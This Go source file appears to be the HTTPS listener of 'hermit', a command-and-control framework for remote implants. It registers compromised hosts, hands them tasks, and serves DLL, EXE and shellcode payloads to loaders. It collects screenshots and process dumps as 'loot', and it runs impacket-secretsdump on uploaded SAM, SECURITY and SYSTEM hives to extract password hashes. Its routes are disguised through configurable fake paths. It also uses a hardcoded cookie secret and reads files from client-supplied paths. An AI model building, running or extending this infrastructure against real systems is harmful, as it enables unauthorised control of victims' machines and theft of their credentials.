package service

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-contrib/sessions"
	"github.com/gin-contrib/sessions/cookie"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"

	"github.com/hideckies/hermit/pkg/common/certs"
	"github.com/hideckies/hermit/pkg/common/crypt"
	"github.com/hideckies/hermit/pkg/common/meta"
	metafs "github.com/hideckies/hermit/pkg/common/meta/fs"
	"github.com/hideckies/hermit/pkg/common/stdout"
	"github.com/hideckies/hermit/pkg/common/utils"
	"github.com/hideckies/hermit/pkg/server/agent"
	"github.com/hideckies/hermit/pkg/server/job"
	"github.com/hideckies/hermit/pkg/server/listener"
	"github.com/hideckies/hermit/pkg/server/state"
	_task "github.com/hideckies/hermit/pkg/server/task"
)

var upgrader = websocket.Upgrader{}

type CheckInData struct {
	OS           string `json:"os"`
	Arch         string `json:"arch"`
	Hostname     string `json:"hostname"`
	ListenerURL  string `json:"listenerURL"`
	ImplantType  string `json:"implantType"`
	Sleep        uint   `json:"sleep"`
	Jitter       uint   `json:"jitter"`
	KillDate     uint   `json:"killDate"`
	AESKeyBase64 string `json:"aesKey"`
	AESIVBase64  string `json:"aesIV"`
}

type LoaderData struct {
	OS            string `json:"os"`
	Arch          string `json:"arch"`
	Hostname      string `json:"hostname"`
	LoaderType    string `json:"loaderType"`
	TargetPayload string `json:"targetPayload"`
	AESKeyBase64  string `json:"aesKey"`
	AESIVBase64   string `json:"aesIV"`
}

type SocketData struct {
}

func handleImplantCheckIn(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		clientIP := ctx.ClientIP()

		session := sessions.Default(ctx)

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		var checkInData CheckInData
		if err := json.Unmarshal(jsonBytes, &checkInData); err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get check-in date
		checkInDate := meta.GetCurrentDateTime()

		// Get AES key/iv
		newAES, err := crypt.NewAESFromBase64Pairs(checkInData.AESKeyBase64, checkInData.AESIVBase64)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Generate a new session and save it.
		newSessionId := utils.GenerateRandomAlphaNum(32)
		session.Set("session_id", newSessionId)
		session.Save()

		// Add new agent to the database
		newAgent, err := agent.NewAgent(
			0,
			uuid.NewString(),
			"",
			clientIP,
			checkInData.OS,
			checkInData.Arch,
			checkInData.Hostname,
			checkInData.ListenerURL,
			checkInData.ImplantType,
			checkInDate,
			checkInData.Sleep,
			checkInData.Jitter,
			checkInData.KillDate,
			newAES,
			newSessionId,
		)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to initialize target agent.")
			return
		}

		if err := serverState.DB.AgentAdd(newAgent); err != nil {
			ctx.String(http.StatusBadRequest, "Failed to add target agent on database.")
			return
		}

		// Make the agent directory and others
		err = metafs.MakeAgentChildDirs(newAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to make agent child directories.")
			return
		}

		// ctx.String(http.StatusOK, targetAgent.Uuid)
		ctx.JSON(http.StatusOK, gin.H{"uuid": newAgent.Uuid, "session_id": newAgent.SessionId})
	}
	return gin.HandlerFunc(fn)
}

func handleImplantDownload(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get agent UUID and session ID
		session := sessions.Default(ctx)
		uuid := ctx.GetHeader("X-UUID")
		sessionID := session.Get("session_id")

		// Check if the agent exists on the database
		var targetAgent *agent.Agent = nil
		ags, err := serverState.DB.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		for _, ag := range ags {
			if ag.Uuid == uuid && ag.SessionId == sessionID {
				targetAgent = ag
				break
			}
		}

		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read the request data (file path to download)
		filenameBytes, err := ctx.GetRawData()
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}
		filename := string(filenameBytes)

		// Prepare the file
		data, err := os.ReadFile(filename)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}
		// Encrypt the data
		dataEnc, err := targetAgent.AES.Encrypt(data)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(dataEnc)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskGet(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get agent UUID and session ID
		session := sessions.Default(ctx)
		uuid := ctx.GetHeader("X-UUID")
		sessionID := session.Get("session_id")

		ags, err := serverState.DB.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to get all agents.")
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == uuid && ag.SessionId == sessionID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "Error: The agent UUID not found.")
			return
		}

		// Get tasks
		tasks, err := metafs.ReadAgentTasks(targetAgent.Name, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to read a task.")
			return
		}
		if len(tasks) == 0 {
			ctx.String(http.StatusBadRequest, "Tasks are not set.")
			return
		}
		// Get the first task and remove it from task list
		currTask := tasks[0]
		err = metafs.DeleteAgentTask(targetAgent.Name, currTask, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to delete a task from file.")
			return
		}

		// Encrypt the task
		encTask, err := targetAgent.AES.Encrypt([]byte(currTask))
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to encrypt the task.")
			return
		}

		ctx.String(http.StatusOK, string(encTask))
	}
	return gin.HandlerFunc(fn)
}

func handleImplantTaskResult(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get agent UUID and session ID
		session := sessions.Default(ctx)
		uuid := ctx.GetHeader("X-UUID")
		sessionID := session.Get("session_id")

		ags, err := serverState.DB.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to get all agents.")
			return
		}

		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == uuid && ag.SessionId == sessionID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to get target agent.")
			return
		}

		// Get result data (encrypted).
		dataEnc, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to get the task result.")
			return
		}
		// Decrypt task result.
		dataDec, err := targetAgent.AES.Decrypt([]byte(dataEnc))
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to decrypt the task result.")
			return
		}

		// Parse JSON
		var taskResult _task.TaskResult
		if len(dataDec) > 0 {
			if err := json.Unmarshal(dataDec, &taskResult); err != nil {
				ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
				return
			}
		}

		content := ""
		switch taskResult.Task.Command.Code {
		// switch taskJSON.Command.Code {
		case _task.TASK_CONNECT:
			// Update listener URL of the agent on the database.
			targetAgent.ListenerURL = taskResult.Result
			serverState.DB.AgentUpdate(targetAgent)

			content = "Listener URL has been updated."
		case _task.TASK_DOWNLOAD:
			downloadPath := taskResult.Result
			content = fmt.Sprintf("Downloaded at %s", downloadPath)
		case _task.TASK_HASHDUMP:
			// Extract uploaded hive paths
			hives := strings.Split(taskResult.Result, ",")
			if len(hives) == 0 {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			samHive := hives[0]
			securityHive := hives[1]
			systemHive := hives[2]
			// Check hive files exist.
			_, err := os.Stat(samHive)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			_, err = os.Stat(securityHive)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			_, err = os.Stat(systemHive)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Dump hashes
			outFile := "/tmp/secretsdump_output"
			_, err = meta.ExecCommand(
				"impacket-secretsdump",
				"-sam", samHive,
				"-security", securityHive,
				"-system", systemHive,
				"-outputfile", outFile,
				"LOCAL",
			)
			if err != nil {
				// If error occured, try 'secretsdump.py' (installed with pip) instead.
				_, err = meta.ExecCommand(
					"secretsdump.py",
					"-sam", samHive,
					"-security", securityHive,
					"-system", systemHive,
					"-outputfile", outFile,
					"LOCAL",
				)
				if err != nil {
					ctx.String(http.StatusBadRequest, "")
					return
				}

			}
			// Read output
			resultSam, err := os.ReadFile(outFile + ".sam")
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			resultSecrets, err := os.ReadFile(outFile + ".secrets")
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = string(resultSam) + "\n" + string(resultSecrets)
		case _task.TASK_JITTER:
			timeStr := taskResult.Task.Args["time"]
			time, err := strconv.ParseUint(timeStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update jitter time on the database
			targetAgent.Jitter = uint(time)
			err = serverState.DB.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The jitter time has been updated."
		case _task.TASK_KILLDATE:
			dtStr := taskResult.Task.Args["datetime"]
			dt, err := strconv.ParseUint(dtStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update killdate on the database
			targetAgent.KillDate = uint(dt)
			err = serverState.DB.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The killdate has been updated."
		case _task.TASK_PROCDUMP:
			agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
				return
			}
			content = fmt.Sprintf("Saved file under %s/procdumps", agLootDir)
		case _task.TASK_SCREENSHOT:
			if strings.Contains(taskResult.Result, "Error:") {
				content = taskResult.Result
			} else {
				agLootDir, err := metafs.GetAgentLootDir(targetAgent.Name, false)
				if err != nil {
					ctx.String(http.StatusBadRequest, "Failed to get agent loot directory.")
					return
				}
				content = fmt.Sprintf("Saved file under %s/screenshots", agLootDir)
			}
		case _task.TASK_SLEEP:
			timeStr := taskResult.Task.Args["time"]
			time, err := strconv.ParseUint(timeStr, 10, 64)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			// Update sleep time on the database
			targetAgent.Sleep = uint(time)
			err = serverState.DB.AgentUpdate(targetAgent)
			if err != nil {
				ctx.String(http.StatusBadRequest, "")
				return
			}
			content = "The sleep time has been updated."
		case _task.TASK_UPLOAD:
			uploadPath := taskResult.Result
			content = fmt.Sprintf("Uploaded at %s", uploadPath)
		default:
			content = taskResult.Result
		}

		// Write the task result to a file.
		taskName, err := taskResult.Task.Encode()
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		_, err = metafs.WriteAgentLoot(targetAgent.Name, taskName, content, false)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}
		ctx.String(http.StatusOK, "OK")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantUpload(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		// Get agent UUID and session ID
		session := sessions.Default(ctx)
		uuid := ctx.GetHeader("X-UUID")
		sessionID := session.Get("session_id")

		// Get the agent
		ags, err := serverState.DB.AgentGetAll()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to get all agents from database.")
			return
		}
		var targetAgent *agent.Agent = nil
		for _, ag := range ags {
			if ag.Uuid == uuid && ag.SessionId == sessionID {
				targetAgent = ag
				break
			}
		}
		if targetAgent == nil {
			ctx.String(http.StatusBadRequest, "Failed to determine the agent.")
			return
		}

		// Get file data (encrypted)
		dataEnc, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to get data.")
			return
		}
		// Decrypt
		data, err := targetAgent.AES.Decrypt(dataEnc)
		if err != nil {
			ctx.String(http.StatusBadRequest, "")
			return
		}

		// Get task
		taskEnc := ctx.GetHeader("X-Task") // This value is Encrypted
		// Decrypt
		task, err := targetAgent.AES.Decrypt([]byte(taskEnc))
		if err != nil {
			ctx.String(http.StatusBadRequest, "Error: Failed to decrypt task.")
			return
		}
		// Delete null-terminated characters
		taskClean := make([]byte, 0, len(task))
		for _, b := range task {
			if b != 0 {
				taskClean = append(taskClean, b)
			}
		}
		// Parse JSON
		var taskJSON _task.Task
		if err := json.Unmarshal(taskClean, &taskJSON); err != nil {
			ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
			return
		}

		if taskJSON.Command.Code == _task.TASK_DOWNLOAD {
			// Get the download path
			downloadPath := ctx.GetHeader("X-File")
			// Check if the file already exists
			if _, err := os.Stat(downloadPath); err == nil {
				ctx.String(http.StatusBadRequest, "File already exists.")
				return
			}

			// Save the file
			err = os.WriteFile(downloadPath, data, 0644)
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else if taskJSON.Command.Code == _task.TASK_HASHDUMP {
			// Save file
			hivePath := ctx.GetHeader("X-File")
			err := os.WriteFile(hivePath, data, 0644)
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else if taskJSON.Command.Code == _task.TASK_PROCDUMP {
			// Save file
			_, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, fmt.Sprintf("procdump %s", taskJSON.Args["pid"]))
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else if taskJSON.Command.Code == _task.TASK_SCREENSHOT {
			// Save file
			_, err := metafs.WriteAgentLootFile(targetAgent.Name, data, false, "screenshot")
			if err != nil {
				ctx.String(http.StatusBadRequest, "Failed to write file.")
				return
			}
		} else {
			ctx.String(http.StatusBadRequest, "Invalid task command.")
			return
		}

		ctx.String(http.StatusOK, "Uploaded successfully.")
	}
	return gin.HandlerFunc(fn)
}

func handleImplantWebSocket(ctx *gin.Context) {
	// Get agent UUID and session ID
	// session := sessions.Default(ctx)
	// uuid := ctx.GetHeader("X-UUID")
	// sessionID := session.Get("session_id")

	stdout.LogSuccess(fmt.Sprintf("Received from %s on WebSocket\n", ctx.ClientIP()))
	w, r := ctx.Writer, ctx.Request
	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		stdout.LogInfo(fmt.Sprint(err))
		return
	}
	defer c.Close()
	for {
		mt, message, err := c.ReadMessage()
		if err != nil {
			stdout.LogInfo(fmt.Sprint(err))
			break
		}
		stdout.LogSuccess(fmt.Sprintf("received: %s", message))
		err = c.WriteMessage(mt, message)
		if err != nil {
			stdout.LogFailed(fmt.Sprint(err))
			break
		}
	}
}

func handleLoaderDownload(lis *listener.Listener, serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		w := ctx.Writer
		header := w.Header()
		header.Set("Transfer-Encoding", "chunked")
		header.Set("Content-Type", "application/octet-stream")

		// Read JSON data
		jsonBytes, err := ctx.GetRawData()
		if err != nil {
			ctx.String(http.StatusBadRequest, "Failed to get data.")
			return
		}
		// Parse JSON
		var ldrData LoaderData
		if err := json.Unmarshal(jsonBytes, &ldrData); err != nil {
			ctx.String(http.StatusBadRequest, "Failed to parse JSON.")
			return
		}

		// Generate AES key/iv
		newAES, err := crypt.NewAESFromBase64Pairs(ldrData.AESKeyBase64, ldrData.AESIVBase64)
		if err != nil {
			ctx.String(http.StatusBadGateway, "Failed to generate AES instance from Base64 key/iv.")
			return
		}

		// Get all payload paths generated under '~/.hermit/server/listeners/<listner>/payloads'.
		payloadPaths, err := metafs.GetListenerPayloadPaths(lis.Name, false, false)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		targetPayloadPath := ""
		// If target payload is specified, download it if it exists.
		for _, payloadPath := range payloadPaths {
			if ldrData.TargetPayload != "" && filepath.Base(payloadPath) == ldrData.TargetPayload {
				targetPayloadPath = payloadPath
				break
			}
		}
		// If target payload is not specified or not found, detect automatically
		if targetPayloadPath == "" {
			for _, payloadPath := range payloadPaths {
				// TODO: more accurate check for file info

				// If target payload is not specified, detect a payload automatically
				if ldrData.OS == "linux" {
					// TODO
					// ...
				}
				if ldrData.OS == "windows" {
					if ldrData.LoaderType == "dll-loader" {
						// Load a DLL file.
						if ldrData.Arch == "amd64" {
							if strings.HasSuffix(payloadPath, ".amd64.dll") {
								targetPayloadPath = payloadPath
								break
							}
						} else if ldrData.Arch == "i686" {
							if strings.HasSuffix(payloadPath, ".i686.dll") {
								targetPayloadPath = payloadPath
								break
							}
						}
					} else if ldrData.LoaderType == "pe-loader" {
						// Load an executable file.
						if ldrData.Arch == "amd64" {
							if strings.HasSuffix(payloadPath, ".amd64.exe") {
								targetPayloadPath = payloadPath
								break
							}
						} else if ldrData.Arch == "i686" {
							if strings.HasSuffix(payloadPath, ".i686.exe") {
								targetPayloadPath = payloadPath
								break
							}
						}
					} else if ldrData.LoaderType == "shellcode-loader" {
						// Load a shellcode (raw) file.
						if ldrData.Arch == "amd64" {
							if strings.HasSuffix(payloadPath, ".amd64.bin") {
								targetPayloadPath = payloadPath
								break
							}
						} else if ldrData.Arch == "i686" {
							if strings.HasSuffix(payloadPath, ".i686.bin") {
								targetPayloadPath = payloadPath
								break
							}
						}
						if strings.HasSuffix(payloadPath, ".bin") {
							targetPayloadPath = payloadPath
							break
						}
					}
				}
			}
		}

		if targetPayloadPath == "" {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Read data from the payload.
		data, err := os.ReadFile(targetPayloadPath)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}
		// Encrypt the data
		dataEnc, err := newAES.Encrypt(data)
		if err != nil {
			w.WriteHeader(http.StatusBadRequest)
			w.(http.Flusher).Flush()
			return
		}

		// Send chunked data
		w.WriteHeader(http.StatusOK)
		chunkedData := utils.ChunkData(dataEnc)
		for _, c := range chunkedData {
			w.Write(c)
			w.(http.Flusher).Flush()
			time.Sleep(time.Duration(1) * time.Second)
		}
	}
	return gin.HandlerFunc(fn)
}

func handleSocketOpen(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		return
	}
	return gin.HandlerFunc(fn)
}

func handleSocketClose(serverState *state.ServerState) gin.HandlerFunc {
	fn := func(ctx *gin.Context) {
		return
	}
	return gin.HandlerFunc(fn)
}

func httpsRoutes(
	router *gin.Engine,
	lis *listener.Listener,
	serverState *state.ServerState,
) {
	fakeRoutes := serverState.Conf.Listener.FakeRoutes

	for _, r := range fakeRoutes["/implant/checkin"] {
		router.POST(r, handleImplantCheckIn(serverState))
	}
	for _, r := range fakeRoutes["/implant/download"] {
		router.POST(r, handleImplantDownload(serverState))
	}
	for _, r := range fakeRoutes["/implant/task/get"] {
		router.GET(r, handleImplantTaskGet(serverState))
	}
	for _, r := range fakeRoutes["/implant/task/result"] {
		router.POST(r, handleImplantTaskResult(serverState))
	}
	for _, r := range fakeRoutes["/implant/upload"] {
		router.POST(r, handleImplantUpload(serverState))
	}
	for _, r := range fakeRoutes["/implant/websocket"] {
		router.GET(r, handleImplantWebSocket)
	}
	for _, r := range fakeRoutes["/loader/download"] {
		router.POST(r, handleLoaderDownload(lis, serverState))
	}
	for _, r := range fakeRoutes["/socket/open"] {
		router.POST(r, handleSocketOpen(serverState))
	}
	for _, r := range fakeRoutes["/socket/close"] {
		router.POST(r, handleSocketClose(serverState))
	}
}

func HttpsStart(
	lis *listener.Listener,
	lisJob *job.ListenerJob,
	serverState *state.ServerState,
) error {
	// Get server certificate paths
	serverCertPath, serverKeyPath, err := certs.GetCertificatePath(
		certs.CATYPE_HTTPS,
		false,
		false,
		lis.Name,
	)
	if err != nil {
		return err
	}

	store := cookie.NewStore([]byte("secret"))

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()
	router.HandleMethodNotAllowed = false
	// router.Use(gin.Recovery())
	router.Use(sessions.Sessions("mysession", store))

	httpsRoutes(router, lis, serverState)

	srv := &http.Server{
		Addr:    fmt.Sprintf("%s:%d", lis.Addr, lis.Port),
		Handler: router,
	}

	go func() {
		for {
			select {
			case uuid := <-lisJob.ChReqQuit:
				if err := srv.Close(); err != nil {
					lisJob.ChError <- uuid
				}
			default:
			}
		}
	}()

	lisJob.ChReady <- lis.Uuid

	if err := srv.ListenAndServeTLS(serverCertPath, serverKeyPath); err != nil {
		if err == http.ErrServerClosed {
			lisJob.ChQuit <- lis.Uuid
			return nil
		} else {
			stdout.LogInfo("srv.ListenAndServeTLS else")
			return err
		}
	}

	return nil
}
